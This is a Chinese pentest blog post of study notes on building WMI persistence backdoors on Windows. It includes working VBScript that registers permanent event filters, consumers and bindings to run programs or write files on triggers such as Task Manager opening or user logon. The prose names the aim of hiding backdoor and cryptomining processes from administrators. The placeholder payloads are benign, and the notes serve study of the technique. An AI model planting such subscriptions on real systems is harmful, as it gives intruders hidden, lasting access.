Title: WMI 
Category: Pentest
Date: 2017-7-12
slug: WMI

###windows下的定时任务


维持权限的话还是考虑WMI事件或者在服务上下手.  如劫持相关服务指向的程序. 未被双引号保护的路径等，添加计划任务一旦被报警.就是整个团队的灾难

劫持dll：
<https://enigma0x3.net/2016/05/25/userland-persistence-with-scheduled-tasks-and-com-handler-hijacking/>

用户层面的定时任务：

在用户登录的时候触犯： 如何修改这个时间，让他每15分钟触发一次。
schtasks.exe /change /RI $minute /tn "name"  //测试失败

这个劫持感觉没毛用啊，
不过把原来计划任务的内容又缝缝补补弄好了。

##WMI后门
###C:\Windows\System32\wbem>WMIC.exe




wmi的逻辑结构是这样的：
首先是wmi使用者，比如脚本或者其他用到wmi接口的应用程序。由wmi使用者访问CIM对象管理器WinMgmt（即WMI服务），后者再访问CIM（公共信息模型Common Information Model）存储库。

静态或动态的信息（对象的属性）就保存在CIM库中，同时保存对象的方法。比如启动一个服务，通过执行对象的方法实现，实际上是通过COM技术调用各种dll，最后由dll中封装的API完成请求。WMI是事件驱动的，操作系统、服务、应用程序、设备驱动程序等都可以作为事件源，通过COM接口生成事件通知，WinMgmt捕捉到事件，然后刷新CIM库中的动态信息。这也是为什么WMI服务依赖于EventLog的原因。就像注册表有根键一样，CIM库也有分类，用面向对象的术语描述来来说，叫做命名空间(Name Space）

<http://huaidan.org/archives/1087.html>


可以调用wmi的方式或者语言:

```
* wmic.exe
* winrm.exe
* winrs.exe
* powershell
* windows scripting host(WSH)
   * VBScript
   * JScript
* mof
* C/C++ via IWbem* COM API
* .NET System.Management classes

```


单一点：
一个定时功能后门的wmi，其中的事件过滤是用WQL查询来触发，wooyun上面油三种触发方式:


###WSH

WSH常用的对象：

####WScript
windows脚本宿主对象模型的根对象，它能提供多个子对象，比如Wscript.Arguments和Wscript.shell，前者提供对整个命令行参数集的访问，后者可以运行程序，操作注册表，创建快捷方式或访问系统文件夹。
####Scripting.FileSystemObject
主要为IIS设计的对象，访问文件系统，几乎所有的windows脚本病毒通过它复制自己感染别人。
####ADODB.Stream
ActiveX Data Objects数据库的字对象，提供流方式访问文件的功能。
####microsoft.XMLHTP
为了支持XML而设计的对象，通过http协议访问网络，常用户跨站脚本执行漏洞和SQL Injection
####ADSI(活动目录服务接口，主要用于windows域管理)
####WBEM对象，wmi服务提供该对象的接口


```
strComputer = "."
Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\default")
Set colEvents = objWMIService.ExecNotificationQuery _
    ("SELECT * FROM RegistryKeyChangeEvent WHERE Hive='HKEY_LOCAL_MACHINE' AND " & _
        "KeyPath='SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'") 
Do
    Set objLatestEvent = colEvents.NextEvent
    Wscript.Echo Now & ": The registry has been modified."
Loop
```


如下例子：vbs脚本操作wmi对象的时候，有两种方法`winmgmts:\\`和`WbemScripting.SWBemlocator`
>not only throuth an SWbemLocator object, but also through the moniker "winmgmts:". A moniker is a short name that locate a namespace、class or instance in WMI. The name "winmgmts:" is the WMI moniker that tell the Windows Script Host to use the WMI objects, connects to the default namespace, and obtains an SWbemServices object.

不过这两者是有异同的，SWbemlocator可以做到WMI moniker不能做到的两个功能（SWbemlocator is designed to address two specific scripting scenarios that cannot be performed using GetObject and the WMI moniker， You must use SWbemLocator if you need to)：

1. provide user and password credentials to connect to WMI on a remote computer. The WMI moniker used with the GetObject function does not include a mechanism for specifying credentials.
2. Connect to WMI if you are runing a WMI script from within a Web page.

创建对象并连接服务器：

```
set objlocator=createobject("wbemscripting.swbemlocator")
set objswbemservices=objlocator.connectserver(ipaddress,"root\default",username,password)
```
访问WMI还有一个特权的额问题。
```
objswbemservices.security_.privileges.add 23,true
objswbemservices.security_.privileges.add 18,true
```
这是在向WMI服务申请权限，18和23都是权限代号，以下是重要的代号:
5 在域中创建账号
7 管理审计并查看、保存和清理安全日志
9 加载和卸载设备驱动
10 记录系统时间
11 改变系统时间
18 在本地关机
22 绕过历遍检查
23 允许远程关机

运行如下脚本可以获得所有权限ID及对应说明
```
strComputer = "."
set objWMIService = GetObject("winmgmts:\\" _
	& strComputer & "\root\cimv2")
set colPrivileges = objWMIService.Security_.Privileges
for I = 1 to 27
colPrivileges.Add(I)
Next
' Display information about each privilege 
For Each objItem In colPrivileges
wscript.echo objItem.Identifier & vbtab & objItem.Name _
    & vbtab & objItem.Displayname _
    & vbtab & "Enabled = " & objItem.IsEnabled
Next
```




```
strComputer="."
set objService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
'set objWmi = CreateObject("WbemScripting.SWBemLocator")
'set objService = objWmi.ConnectServer(strComputer, "root\cimv2")
set objSet = objService.InstancesOf("Win32_Process")
for each obj in objSet
    Wscript.Echo "Name: " & obj.Name
Next
```

wmi是事件驱动，整个事件处理机制分4个部分:
1、事件生产者（provider)，负责生产事件。WMI包含大量事件生产者。
2、事件过滤器(fileter），系统每时每刻有大量的事件，通过自定义过滤器，脚本可以捕获感兴趣的事件进行处理。
3、事件消费者（consumer)：负责处理事件，他是由可执行程序，动态链接库(dll，由wmi服务加载)或者脚本
4、事件绑定(binding）：通过将过滤器和消费者绑定，明确什么事件由什么消费者负责处理

事件消费者可以分为临时和永久两类，临时的事件消费者只在其运行期间关心特定事件并处理，永久消费者作为类的实例注册在WMI命名空间中，一直有效到它被注销。


###EvenetFilter

1: Data queries

`select * from Win32_NTlogEvent where logfile = 'application'`
辣么，上面这个语句是否可以修改下，类似远程控制iptables的方式，当检测到logfile里面存在特定字符，触发事件

2: Evenet queries

`select * from __InstanceModificationEvent WITHIN 10 where TargetInstance ISA 'Win32_Service' AND TargetInstance._Class = 'win32_TerminalService'`

3: Schema queries

`select * from meta_class where __this ISA "Win32_BaseService"`

###consumer
可以理解为满足条件之后执行的操作，包括如下查询:

```
（1） ActiveScriptEventConsumer
 (2) LogFileEventConsumer
 (3) NTEventLogEventConsumer
 (4) SMTPEventConsumer
 (5) CommandLineEventConsumer

```

wmi需要两个可以执行，Eventfilter和consumer。

EventFilter

```
select * from __InstanceModificationEvent where TargetInstance Isa "Win32_localTime" And TargetInstance.Second = 1

select * from __InstanceModificationEvent WITHIN 10 where TargetInstance ISA 'Win32_Service' AND TargetInstance._Class = 'win32_TerminalService'

select * from _InstanceModificationEvent within 5 where Targetinstance ISA 'Win32_service' AND 
TargetInstance.name = 'spooler' and Targetinstatnce.state='stopped'

```

2003系统上，一个用户登陆的时候，日志记录ID是680，注销断开的时候ID是551，所以当一个用户登陆的时候，wmi监测登陆id，如果登陆成功，杀掉后们和挖矿进程。
杀掉进程有这么几个条件，任何一个成立都杀掉：

用户成功登陆
打开任务管理器
打开cmd


所以，说了这么多，这个vbs脚本应该怎么写？
1. vbs脚本运行其他程序，比如cmd
2. 满足条件之后绑定消费事件


WMI提供了两个计时器：__AbsoluteTimerInstruction和__IntervalTimerInstruction

WMI提供了三个类别的WQL查询：

1. 实例查询  －－用于查询WMI类的实例
```
select <class property name> from <class name> where <>
```

2. 事件查询  －－用于一个WMI事件注册机制，如WMI对象的创建，修改或删除

```
交互式用户登录的事件查询：
SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_LogonSession' AND TargetInstance.LogonType = 2
```
3. 元查询    －－用于查询WMI类架构

```
select * from Meta_classes where __class like "win32%"
```



例子:

每10s查询一次事件修改，记录

```
strComputer = "." 
Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2") 
Set colMonitorProcess = objWMIService.ExecNotificationQuery _ 
 ("SELECT * FROM __instancemodificationevent WITHIN 10" & _ 
 "WHERE TargetInstance ISA 'Win32_Service'")  
WScript.Echo "Waiting for process change event ..." 
Set objLatestEvent = colMonitorProcess.NextEvent 
WScript.Echo VbCrLf & objLatestEvent.Path_.Class 
Wscript.Echo "Process Name: " & objLatestEvent.TargetInstance.Name 
Wscript.Echo "Process ID: " & objLatestEvent.TargetInstance.ProcessId 
Wscript.Echo "Process State:" & objLatestEvent.TargetInstance.state
WScript.Echo "Time: " & Now 
```



以下来自鬼哥的文章：<http://huaidan.org/archives/1087.html>

稍微修改了下，大概功能就是打开任务管理器的时候，5s之内会打开calc.exe，这个动作可以在process explorer里面监测到。
脚本稍微不同的地方是:

`__EventFilter`的时候，要制定命名空间为`root\cimv2`,整个脚本是注册在`root\subscription`里面的。

一句话:
以`root\cimv2`空间的事件为驱动，使用`root\subscription`空间里面的`CommandLineEventConsumer`来运行程序。

```
nslink="winmgmts:\\.\root\cimv2:"         '只需要本地连接，所以用这种语法，不用swbemlocator对象'
nslink2="winmgmts:\\.\root\subscription:"
set asec=getobject(nslink2&"CommandLineEventConsumer").spawninstance_   '创建“活动脚本事件消费者”'
asec.name="stopped_spooler_restart_consumer"                  '定义消费者的名字'
'asec.scriptingengine="vbscript"                               '定义脚本语言(只能是vbscript)'
asec.CommandLineTemplate="C:\windows\system32\calc.exe"  '脚本代码'
asec.ExecutablePath="C:\windows\system32\calc.exe"
set asecpath=asec.put_                                        '注册消费者，返回其链接'

set evtflt=getobject(nslink2&"__EventFilter").spawninstance_   '创建事件过滤器'
evtflt.name="stopped_spooler_filter" 
evtflt.EventNameSpace="root\cimv2"                         '定义过滤器的名字'
qstr="select * from __InstanceCreationEvent within 5 "    '每5秒查询一次“实例修改事件”'
qstr=qstr&"where targetinstance isa 'win32_process' and "   '目标实例的类是win32_process'
qstr=qstr&"targetinstance.name='taskmgr.exe' "                  '实例名是taskmgr.exe'
evtflt.query=qstr                                             '定义查询语句'
evtflt.querylanguage="wql"                                    '定义查询语言(只能是wql)'
set fltpath=evtflt.put_                                       '注册过滤器，返回其链接'

set fcbnd=getobject(nslink2&"__FilterToConsumerBinding").spawninstance_  '创建过滤器和消费者的绑定'
fcbnd.consumer=asecpath.path                                            '指定消费者'
fcbnd.filter=fltpath.path                                               '指定过滤器'
fcbnd.put_                                                              '执行绑定'

wscript.echo "success"
```

上面提到过有5种消费者，然后这次以LogFileEventConsumer来测试，打开任务管理器之后，在C盘根目录下生成1.php，内容是`<?php phpinfo();?>`:

```
nslink="winmgmts:\\.\root\cimv2:"         '只需要本地连接，所以用这种语法，不用swbemlocator对象'
nslink2="winmgmts:\\.\root\subscription:"
set asec=getobject(nslink2&"LogFileEventConsumer").spawninstance_   '创建“活动脚本事件消费者”'
asec.name="stopped_spooler_restart_consumer"                  '定义消费者的名字'
'asec.scriptingengine="vbscript"                               '定义脚本语言(只能是vbscript)'
'asec.CommandLineTemplate="C:\windows\system32\calc.exe"  '脚本代码'
'asec.ExecutablePath="C:\windows\system32\calc.exe"
asec.Filename="C:\1.php"
asec.Text="<?php phpinfo();?>"
set asecpath=asec.put_                                        '注册消费者，返回其链接'

set evtflt=getobject(nslink2&"__EventFilter").spawninstance_   '创建事件过滤器'
evtflt.name="stopped_spooler_filter" 
evtflt.EventNameSpace="root\cimv2"                         '定义过滤器的名字'
qstr="select * from __InstanceCreationEvent within 5 "    '每5秒查询一次“实例修改事件”'
qstr=qstr&"where targetinstance isa 'win32_process' and "   '目标实例的类是win32_service'
qstr=qstr&"targetinstance.name='taskmgr.exe' "                  '实例名是spooler'
evtflt.query=qstr                                             '定义查询语句'
evtflt.querylanguage="wql"                                    '定义查询语言(只能是wql)'
set fltpath=evtflt.put_                                       '注册过滤器，返回其链接'

set fcbnd=getobject(nslink2&"__FilterToConsumerBinding").spawninstance_  '创建过滤器和消费者的绑定'
fcbnd.consumer=asecpath.path                                            '指定消费者'
fcbnd.filter=fltpath.path                                               '指定过滤器'
fcbnd.put_                                                              '执行绑定'

wscript.echo "success"
```



wmi监听用户登录和注销事件：

2003系统上，一个用户登陆的时候，日志记录ID是680，注销断开的时候ID是551，所以当一个用户登陆的时候，wmi监测登陆id，如果登陆成功，打开calc.exe：

```
nslink="winmgmts:\\.\root\cimv2:"         '只需要本地连接，所以用这种语法，不用swbemlocator对象'
nslink2="winmgmts:\\.\root\subscription:"
set asec=getobject(nslink2&"CommandLineEventConsumer").spawninstance_   '创建“活动脚本事件消费者”'
asec.name="stopped_spooler_restart_consumer"                  '定义消费者的名字'
'asec.scriptingengine="vbscript"                               '定义脚本语言(只能是vbscript)'
asec.CommandLineTemplate="C:\windows\system32\calc.exe"  '脚本代码'
set asecpath=asec.put_                                        '注册消费者，返回其链接'

set evtflt=getobject(nslink2&"__EventFilter").spawninstance_   '创建事件过滤器'
evtflt.name="stopped_spooler_filter" 
evtflt.EventNameSpace="root\cimv2"                         '定义过滤器的名字'
qstr="select * from __InstanceCreationEvent within 5 "    '每5秒查询一次“实例修改事件”'
qstr=qstr&"where targetinstance isa 'win32_NTLogEvent' and "   qstr=qstr&"targetinstance.EventCode='680' "                  '实例名是win32_NTLogEvent'
evtflt.query=qstr                                             '定义查询语句'
evtflt.querylanguage="wql"                                    '定义查询语言(只能是wql)'
set fltpath=evtflt.put_                                       '注册过滤器，返回其链接'

set fcbnd=getobject(nslink2&"__FilterToConsumerBinding").spawninstance_  '创建过滤器和消费者的绑定'
fcbnd.consumer=asecpath.path                                            '指定消费者'
fcbnd.filter=fltpath.path                                               '指定过滤器'
fcbnd.put_                                                              '执行绑定'

wscript.echo "success"
```


```
在每分钟的第5s之行一次
select * from __instanceModificationEvent where targetinstance ISA 'win32_localtime' and targetinstance.Second=5

```

wmi对象在硬盘中是存储在`C:\Windows\System32\wbem\Repository\fs\objects.data`


##遗留问题:

微软的官网有这么一段话:

>A single event filter can be associated with multiple logical event consumer. Furthermore, multiple event filters can be associated with a single logical event consumer.

多个消费者可以对应一个filter，多个filter也可以对应一个消费者。但是实际测试并没有成功，在多个filter存在的情况下，消费未达到期望，测试代码:

测试期望是5s之内打开cmd和taskmgr的时候会打开calc.exe，实际测试未成功。

```

nslink="winmgmts:\\.\root\cimv2:"         
nslink2="winmgmts:\\.\root\subscription:"
set asec=getobject(nslink2&"CommandLineEventConsumer").spawninstance_   
asec.name="taskmgr_consumer"                                                
asec.CommandLineTemplate="cmd /C calc.exe"  
set asecpath=asec.put_                                        

set evtflt=getobject(nslink2&"__EventFilter").spawninstance_   
evtflt.name="taskmgr" 
evtflt.EventNameSpace="root\cimv2"                         
qstr="select * from __InstanceCreationEvent within 5 "    
qstr=qstr&"where targetinstance isa 'win32_process' and "   
qstr=qstr&"targetinstance.name='taskmgr.exe'"                
evtflt.query=qstr                                             
evtflt.querylanguage="wql"                                    
set fltpath=evtflt.put_                                       


'set evtflt2=getobject(nslink2&"__EventFilter").spawninstance_   
'evtflt2.name="taskmgr2" 
'evtflt2.EventNameSpace="root\cimv2"                         
'qstr2="select * from __InstanceCreationEvent within 5 "    
'qstr2=qstr2&"where targetinstance isa 'win32_process' and "   
'qstr2=qstr2&"targetinstance.name='cmd.exe' "                
'evtflt2.query=qstr2                                             
'evtflt2.querylanguage="wql"                                    
'set fltpath2=evtflt2.put_  

set fcbnd=getobject(nslink2&"__FilterToConsumerBinding").spawninstance_  
fcbnd.consumer=asecpath.path                                            
fcbnd.filter=fltpath.path                                               
fcbnd.put_                
'fcbnd.filter=fltpath2.path
'fcbnd.put_                                              
wscript.echo "success"

'set fcbnd=getobject(nslink2&"__FilterToConsumerBinding").spawninstance_  
'fcbnd.consumer=asecpath.path                                            
'fcbnd.filter=fltpath2.path                                               
'fcbnd.put_                                                              
'wscript.echo "success2"
```


下面这个脚本是用来监控事件变化的，可以根据需要自己修改。

```
strComputer = "." 
Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2") 
Set colMonitorProcess = objWMIService.ExecNotificationQuery _ 
 ("SELECT * FROM __instanceCreationEvent WITHIN 5" & _ 
 "WHERE TargetInstance ISA 'win32_NTLogEvent'")  
WScript.Echo "Waiting for process change event ..." 
while 1>0
Set objLatestEvent = colMonitorProcess.NextEvent 
WScript.Echo VbCrLf & objLatestEvent.Path_.Class 
Wscript.Echo "Process Name: " & objLatestEvent.TargetInstance.EventCode 
Wscript.Echo "Process ID: " & objLatestEvent.TargetInstance.Categorystring 
WScript.Echo "Time: " & Now 
wend
'__instanceDeletionEvent
'__instanceModificationEvent
```

* <https://msdn.microsoft.com/en-us/library/mt703459(v=vs.85).aspx>
* <https://msdn.microsoft.com/en-us/library/aa393719(v=vs.85).aspx>
* <http://wooyun.jozxing.cc/static/drops/tips-8189.html>
* <http://wooyun.jozxing.cc/static/drops/tips-12354.html>
* <https://www.sans.org/summit-archives/file/summit-archive-1492184420.pdf>